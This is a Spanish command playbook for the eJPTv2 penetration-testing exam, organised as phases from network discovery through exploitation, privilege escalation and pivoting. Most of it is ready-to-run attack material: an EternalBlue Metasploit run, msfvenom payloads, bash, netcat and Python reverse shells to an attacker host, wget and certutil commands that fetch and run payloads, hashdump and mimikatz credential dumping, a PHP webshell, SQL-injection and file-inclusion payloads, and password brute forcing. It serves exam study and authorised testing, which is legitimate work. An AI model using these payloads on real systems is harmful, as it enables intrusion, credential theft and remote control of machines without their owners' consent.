# eJPTv2 — Metodología paso a paso (Command Notes)

> Playbook 100% orientado a comandos para el **eJPTv2 (INE / eLearnSecurity Junior Penetration Tester v2)**.
> **Sigue las fases en orden, de arriba abajo, por cada host.** Cada paso indica qué lanzar, cómo leer el resultado y a qué fase saltar.
> Enfoque práctico: metodología + enumeración exhaustiva + **Metasploit** (núcleo del examen).
> Sustituye `$IP`, `$RANGE`, `$LHOST`, etc. por tus valores.

---

## Mapa de la metodología

```
FASE 0  Preparación del entorno
FASE 1  Descubrimiento de red        → ¿qué hosts hay?
FASE 2  Escaneo de puertos           → ¿qué puertos/servicios por host?
FASE 3  Enumeración por servicio     → aquí sale el 80% del ataque
FASE 4  Búsqueda de vulnerabilidades → searchsploit + NSE + Metasploit
FASE 5  Explotación / ganar acceso   → shell inicial
FASE 6  Post-explotación             → estabilizar + loot
FASE 7  Escalada de privilegios      → root / SYSTEM
FASE 8  Pivoting                     → ¿hay 2ª red? → volver a FASE 1
FASE 9  Documentar y responder panel
```

> **Regla de oro:** enumera antes de explotar. Si te atascas, casi siempre es porque falta enumeración en la FASE 3.

---

## FASE 0 — Preparación

```bash
# 1. Variables de trabajo (exporta al empezar)
export IP=10.10.10.10
export RANGE=10.10.10.0/24
export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
export LPORT=4444
echo $IP $RANGE $LHOST

# 2. Carpeta de trabajo y notas
mkdir -p ~/eng/$IP/{scans,loot,exploits,www} && cd ~/eng/$IP

# 3. Confirmar conectividad con la VPN/target
ping -c2 $IP
```

**Salida de la fase:** entorno listo → **FASE 1**.

---

## FASE 1 — Descubrimiento de red

**Objetivo:** identificar qué hosts están vivos en el rango.

```bash
nmap -sn $RANGE -oN scans/hosts.txt          # ping sweep
nmap -sn $RANGE -oG - | grep Up | awk '{print $2}'   # solo IPs vivas
# Alternativas si ICMP está filtrado:
netdiscover -r $RANGE                          # ARP (misma LAN)
fping -a -g $RANGE 2>/dev/null
```

**Decisión:**
- Varios hosts → trabaja uno a uno; repite FASE 2–7 en cada uno.
- Solo tienes 1 IP → **FASE 2** directamente.

---

## FASE 2 — Escaneo de puertos

**Objetivo:** por cada host, saber qué puertos abren y qué servicio/versión corren.

```bash
# Paso 1: todos los puertos TCP, rápido
nmap -p- --min-rate 5000 -T4 $IP -oN scans/allports.txt

# Paso 2: guardar puertos abiertos en variable
ports=$(grep '^[0-9]' scans/allports.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
echo $ports

# Paso 3: versión + scripts default + SO sobre esos puertos
nmap -p$ports -sVC -O $IP -oN scans/detailed.txt

# Paso 4: UDP top-100 (SNMP, TFTP, etc. aparecen en el examen)
sudo nmap -sU --top-ports 100 $IP -oN scans/udp.txt
```

**Flags que debes dominar:** `-sS` (SYN), `-sT` (connect), `-sU` (UDP), `-sV` (versión), `-sC` (scripts default), `-O` (SO), `-Pn` (sin ping), `-p-` (todos), `--min-rate`, `-oA` (todas las salidas).

**Decisión (lee `detailed.txt` y ve a la sub-sección de cada servicio en FASE 3):**

| Puerto | Servicio | Ir a |
|--------|----------|------|
| 21 | FTP | 3.1 |
| 22 | SSH | 3.2 |
| 25 | SMTP | 3.3 |
| 53 | DNS | 3.4 |
| 80/443 | HTTP(S) | 3.5 |
| 139/445 | SMB | 3.6 |
| 161/udp | SNMP | 3.7 |
| 3306/1433 | MySQL/MSSQL | 3.8 |
| 2049 | NFS | 3.9 |
| 3389 | RDP | 3.10 |

---

## FASE 3 — Enumeración por servicio

> Enumera **todos** los servicios abiertos antes de pasar a explotar. Anota versiones exactas.

### 3.1 FTP (21)

```bash
nmap --script ftp-anon,ftp-syst -p21 $IP
ftp $IP                                        # probar anonymous:anonymous
wget -r ftp://anonymous:anonymous@$IP/         # si hay acceso anónimo
```

**Con Metasploit:**
```
use auxiliary/scanner/ftp/ftp_version          # banner / versión del servidor
set RHOSTS $IP
run

use auxiliary/scanner/ftp/anonymous            # comprobar login anónimo
set RHOSTS $IP
run

use auxiliary/scanner/ftp/ftp_login            # fuerza bruta de credenciales
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE pass.txt
run
```
→ Si login anónimo o archivos interesantes: guarda en `loot/`. Anota versión para **FASE 4**.

### 3.2 SSH (22)

```bash
nmap --script ssh2-enum-algos,ssh-auth-methods -p22 $IP
```
Metasploit (alt): `auxiliary/scanner/ssh/ssh_version` · `auxiliary/scanner/ssh/ssh_login` (con `USER_FILE`/`PASS_FILE`)
→ Rara vez explotable directo; guárdalo para probar credenciales encontradas más tarde.

### 3.3 SMTP (25)

```bash
nmap --script smtp-commands,smtp-enum-users -p25 $IP
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP
```
Metasploit (alt): `auxiliary/scanner/smtp/smtp_version` · `auxiliary/scanner/smtp/smtp_enum`
→ Usuarios válidos = insumo para fuerza bruta (FASE 5).

### 3.4 DNS (53)

```bash
dig axfr $DOMAIN @$IP                           # zone transfer
dnsrecon -d $DOMAIN -n $IP -t axfr
```

### 3.5 HTTP/HTTPS (80/443)

```bash
whatweb $URL                                    # tecnología
nikto -h $URL -o scans/nikto.txt                # vulnerabilidades comunes
curl -s $URL/robots.txt; curl -s $URL/sitemap.xml

# Descubrimiento de contenido
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Metasploit (alt): `auxiliary/scanner/http/http_version` · `auxiliary/scanner/http/dir_scanner` · `auxiliary/scanner/http/robots_txt`
→ Panel de login, CMS o versión concreta: apunta a **FASE 4** (searchsploit) y a **FASE 10 (web)** si hay parámetros.

### 3.6 SMB / NetBIOS (139/445) — el más rentable del examen

```bash
nmap --script "smb-enum-*,smb-os-discovery,smb-vuln-*" -p139,445 $IP
enum4linux-ng -A $IP                            # enumeración completa
smbclient -L //$IP/ -N                          # listar shares (sesión nula)
smbclient //$IP/SHARE -N                        # conectar sin credenciales
smbmap -H $IP                                   # permisos de shares
rpcclient -U "" -N $IP                          # enumdomusers / queryuser
```
Metasploit (alt): `auxiliary/scanner/smb/smb_version` · `auxiliary/scanner/smb/smb_enumshares` · `auxiliary/scanner/smb/smb_enumusers` · `auxiliary/scanner/smb/smb_login`
→ `smb-vuln-ms17-010` positivo = EternalBlue (FASE 5). Shares legibles = loot. Usuarios = fuerza bruta.

### 3.7 SNMP (161/udp)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v2c -c public $IP                      # volcado completo
snmp-check $IP -c public
```
Metasploit (alt): `auxiliary/scanner/snmp/snmp_enum` · `auxiliary/scanner/snmp/snmp_login` (prueba community strings)
→ Community `public`/`private` suele filtrar usuarios, procesos y puertos internos.

### 3.8 MySQL (3306) / MSSQL (1433)

```bash
nmap --script mysql-*,ms-sql-info,ms-sql-empty-password -p3306,1433 $IP
mysql -h $IP -u root -p
```
Metasploit (alt): `auxiliary/scanner/mysql/mysql_login` · `auxiliary/scanner/mssql/mssql_login` · `auxiliary/admin/mssql/mssql_enum`

### 3.9 NFS (2049)

```bash
showmount -e $IP                                 # ver exports
sudo mount -t nfs $IP:/share /mnt/nfs -o nolock
```

### 3.10 RDP (3389)

```bash
nmap --script rdp-enum-encryption -p3389 $IP
xfreerdp /u:$USER /p:$PASS /v:$IP                # cuando tengas credenciales
```

**Salida de la FASE 3:** lista de versiones + credenciales/usuarios encontrados → **FASE 4**.

---

## FASE 4 — Búsqueda de vulnerabilidades

**Objetivo:** convertir "servicio X versión Y" en un exploit concreto.

```bash
nmap --script vuln $IP -oN scans/vuln.txt        # barrido NSE

searchsploit <servicio> <versión>                # buscar exploit
searchsploit -m <ruta>                           # copiar exploit a cwd
searchsploit -x <ruta>                           # inspeccionar

# En Metasploit (ver FASE 5):
# search type:exploit name:<servicio>
```

**Decisión:**
- Hay módulo Metasploit → **FASE 5 (ruta Metasploit)**.
- Solo exploit público → **FASE 5 (ruta manual)**.
- Es web (SQLi/LFI/upload) → **FASE 10**.

---

## FASE 5 — Explotación (ganar acceso)

### Ruta A — Metasploit (preferente en eJPTv2)

```bash
sudo msfdb init && msfconsole -q
```
```
workspace -a $IP
db_nmap -sVC -p$ports $IP          # alimenta hosts/services en la DB

search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
info                               # leer requisitos
show options
set RHOSTS $IP
set LHOST tun0
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                              # si el módulo lo soporta
exploit
```

**Scanners auxiliary útiles antes de explotar:**
```
use auxiliary/scanner/smb/smb_login       # spray de credenciales
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE pass.txt
run
```

**Gestión de sesiones:**
```
sessions -l          # listar
sessions -i 1        # interactuar
background           # (o Ctrl+Z) enviar a segundo plano
```

### Ruta B — Manual (msfvenom + handler o netcat)

```bash
# 1. Generar payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o loot/shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o loot/shell.elf
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o loot/rev.php

# 2a. Listener con Metasploit
# use exploit/multi/handler; set PAYLOAD <mismo>; set LHOST tun0; set LPORT 4444; exploit -j
# 2b. Listener con netcat (para shells simples)
rlwrap nc -lvnp $LPORT
```

**Reverse shells rápidas (si ya ejecutas comandos en la víctima):**
```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1                              # Bash
mkfifo /tmp/f;nc $LHOST $LPORT </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f  # nc sin -e
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

**Transferir el payload a la víctima:**
```bash
python3 -m http.server 80                        # servidor en tu Kali
# En la víctima:
wget http://$LHOST/shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s          # Linux
certutil -urlcache -f http://$LHOST/shell.exe shell.exe && shell.exe          # Windows
```

**Salida de la FASE 5:** tienes una shell → **FASE 6**.

---

## FASE 6 — Post-explotación (estabilizar + loot)

### Estabilizar shell (Linux)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

### Meterpreter — primeros comandos

```
sysinfo
getuid
ps ; migrate <PID>              # migrar a proceso estable
shell                           # shell nativa
hashdump                        # hashes SAM (Windows)
load kiwi ; creds_all           # mimikatz
download <remoto> <local>
```

### Loot a recolectar (siempre)

```bash
# Linux
cat /etc/passwd; ls -la /home/*/; cat /home/*/.ssh/id_rsa
grep -rn "password" /var/www 2>/dev/null
# Windows
type C:\Users\*\Desktop\*.txt
```

**Salida:** credenciales/hashes → prueba reutilizarlas en otros servicios/hosts. Luego **FASE 7**.

---

## FASE 7 — Escalada de privilegios

### Enumeración (Linux)

```bash
id; sudo -l                       # ¿qué puedo correr como root?
find / -perm -4000 2>/dev/null    # binarios SUID
cat /etc/crontab                  # tareas programadas
uname -a                          # kernel (buscar exploit)
./linpeas.sh
```

### Enumeración (Windows)

```cmd
whoami /priv
whoami /all
systeminfo
net localgroup administrators
```
```powershell
.\winPEAS.exe
```

### Con Metasploit

```
run post/multi/recon/local_exploit_suggester
use post/multi/manage/shell_to_meterpreter     # de shell simple a meterpreter
getsystem                                        # intentar SYSTEM
```

**Cracking de hashes obtenidos:**
```bash
hashid <hash>
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt      # 1000=NTLM, 0=MD5
```

**Salida:** root/SYSTEM → **FASE 8** o **FASE 9**.

---

## FASE 8 — Pivoting (¿hay una segunda red?)

**Comprueba siempre** tras comprometer un host:
```bash
ip a ; route -n              # Linux
ipconfig /all               # Windows
```
Si aparece una subred nueva (p. ej. `10.10.20.0/24`) → pivota y **vuelve a la FASE 1** contra esa red.

### Con Metasploit (desde sesión meterpreter)

```
run autoroute -s 10.10.20.0/24            # ruta a la red interna
# Escanear la red interna a través del pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.20.5
run
# Port forward de un puerto interno a tu Kali
portfwd add -l 3389 -p 3389 -r 10.10.20.5
# SOCKS proxy para herramientas externas
use auxiliary/server/socks_proxy
set VERSION 5 ; set SRVPORT 1080 ; run
```

### proxychains

```bash
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.20.5
proxychains crackmapexec smb 10.10.20.0/24
```

---

## FASE 9 — Documentar y responder el panel

- Anota por host: puertos, versiones, credenciales, ruta de explotación, flags.
- Muchas preguntas del examen se responden **solo con enumeración** (nombres de usuario, versiones, shares, hashes). No hace falta explotar para contestarlas.
- Revisa que **todas** las preguntas del panel tengan respuesta antes de cerrar.

---

## FASE 10 — Web (ruta específica desde la 3.5)

### SQL Injection

```bash
# Manual
' OR 1=1-- -
' UNION SELECT NULL,NULL-- -
# sqlmap (petición capturada en Burp)
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D <db> -T <tabla> --dump
```

### LFI / RFI

```
$URL?page=../../../../etc/passwd
$URL?page=php://filter/convert.base64-encode/resource=index.php
$URL?page=http://$LHOST/shell.php            # RFI si allow_url_include=On
```

### Command injection

```
; id      | id      `id`      $(id)      && whoami
```

### File upload (webshell)

```php
<?php system($_GET['cmd']); ?>
```
→ Sube como `shell.php.jpg` / `shell.phtml`, cambia `Content-Type` a `image/jpeg` en Burp si hay filtro. Luego → **FASE 5** para reverse shell.

### Fuerza bruta de logins

```bash
hydra -L users.txt -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

---

## Referencia rápida

**Wordlists:**
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

**Modos hashcat frecuentes:** `0` MD5 · `100` SHA1 · `1000` NTLM · `1800` sha512crypt · `500` md5crypt.

---

> **Nota:** usar únicamente en laboratorios propios, entornos autorizados o el examen. Enumera siempre antes de explotar.
